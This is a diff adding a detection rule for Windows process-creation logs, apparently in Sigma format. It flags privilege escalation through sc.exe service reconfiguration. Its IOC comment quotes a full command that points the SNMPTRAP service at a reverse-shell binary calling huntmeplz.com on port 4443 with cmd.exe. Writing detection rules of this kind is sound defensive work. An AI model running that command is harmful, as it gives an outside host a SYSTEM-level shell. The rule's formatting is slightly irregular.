@@ -1,0 +1,37 @@
+#Intel Analysis - Service Modification privileges to achieve System privileges.
+#IOC1 - Image: sc.exe
+#IOC2 - CommandLine: sc.exe config SNMPTRAP binPath= "C:\Users\victim\AppData\Local\Temp\rev.exe huntmeplz.com 4443 -e cmd.exe"
+
+#Rule Identification
+title: Service Modification privileges to achieve System privileges using Service Control Manager (SC) tool
+status: experimental
+description: Detect the reverse shell execution via SC tool
+author: Mirza Mansoor Ali Baig
+date: 30/01/2024
+#Log Source
+log source:
+     product: windows
+     category: process_creation
+#Detection Description
+detection:
+    selection:
+       EventID: 1
+       Image|endswith:
+       - '\sc.exe'
+       CommandLine|Contains|all:
+       - 'sc.exe'
+       - '-e cmd.exe'
+       - 'binPath'
+       - 'config'
+condition: selection
+#Rule Identification
+falsepositives:
+   - Legit Red Teamers testing for Privilege Escalation purposes
+level:
+   - Medium
+references:
+   - https://attack.mitre.org/groups/G0016/
+   - https://attack.mitre.org/techniques/T1562/001/
+tags:
+   - attack.defense_evasion
+   - attack.T1562.001
